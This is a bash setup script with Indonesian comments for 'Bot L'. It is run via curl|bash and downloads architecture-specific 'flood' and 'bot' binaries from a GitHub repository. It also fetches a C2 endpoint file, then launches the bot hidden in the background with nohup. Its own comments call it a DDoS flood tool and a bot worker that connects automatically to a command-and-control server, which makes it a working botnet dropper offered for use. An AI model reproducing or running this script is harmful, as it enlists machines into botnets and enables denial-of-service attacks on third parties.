#!/usr/bin/env bash
# ==============================================================================
# Setup Bot L — curl|bash, NixOS friendly
# Otomatis: download biner bot + flood binary L, lalu jalankan bot di background.
# ==============================================================================
set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"
TARGET_DIR="${HOME}/.botl"

echo "=================================================="
echo "          Initializing Bot L Setup                "
echo "=================================================="

ARCH=$(uname -m 2>/dev/null || echo "x86_64")
echo "[*] Architecture: ${ARCH} | OS: $(uname -s) $(uname -r)"

case "${ARCH}" in
    x86_64|amd64)      BIN_ARCH="x86_64" ;;
    aarch64|arm64)     BIN_ARCH="aarch64" ;;
    arm*|armv7*|armhf) BIN_ARCH="armv7l" ;;
    i*86|x86)          BIN_ARCH="x86" ;;
    *)                 BIN_ARCH="x86_64" ;;
esac

mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

download_file() {
    URL="$1"
    DEST="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "${URL}?t=$(date +%s)" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q "${URL}?t=$(date +%s)" -O "${DEST}"
    else
        return 1
    fi
}

# ---- flood "L" (x86_64 primary; fallback ke flood static utk arch lain) ----
FLOOD_OK=0
if [ "${BIN_ARCH}" = "x86_64" ]; then
    echo "[*] Downloading L flood (x86_64)..."
    if download_file "${REPO_BASE}/bots/tls/L" "./flood" && [ -s "./flood" ]; then
        chmod +x "./flood"
        FLOOD_OK=1
    fi
else
    echo "[*] Downloading static flood (${BIN_ARCH})..."
    if download_file "${REPO_BASE}/methods_cpp/flood-${BIN_ARCH}" "./flood" && [ -s "./flood" ]; then
        chmod +x "./flood"
        FLOOD_OK=1
    fi
fi

if [ "${FLOOD_OK}" -eq 0 ]; then
    echo "[!] Using generic static flood fallback..."
    if download_file "${REPO_BASE}/methods_cpp/flood" "./flood" && [ -s "./flood" ]; then
        chmod +x "./flood"
        FLOOD_OK=1
    fi
fi

# ---- bot worker (angkatan konek otomatis ke C2) ----
BOT_OK=0
if download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "./bot" && [ -s "./bot" ]; then
    chmod +x "./bot"
    BOT_OK=1
else
    if download_file "${REPO_BASE}/bots/bot" "./bot" && [ -s "./bot" ]; then
        chmod +x "./bot"
        BOT_OK=1
    fi
fi

# ---- agent.txt (endpoint C2) ----
download_file "${REPO_BASE}/agent.txt" "./agent.txt" 2>/dev/null || true

if [ ! -x ./flood ]; then
    echo "[!] flood binary gagal didapat. Aborting."
    exit 1
fi
if [ ! -x ./bot ]; then
    echo "[!] bot binary gagal didapat. Aborting."
    exit 1
fi

# Bersihkan instance lama
pkill -f "./bot" 2>/dev/null || true
sleep 1

echo "[+] Memulai bot di background..."
nohup ./bot >/dev/null 2>&1 &
BOT_PID=$!

ls -la
echo "[+] Bot L berjalan dengan PID: ${BOT_PID}"
echo "=================================================="
echo "         Bot L Setup Complete & Active            "
echo "=================================================="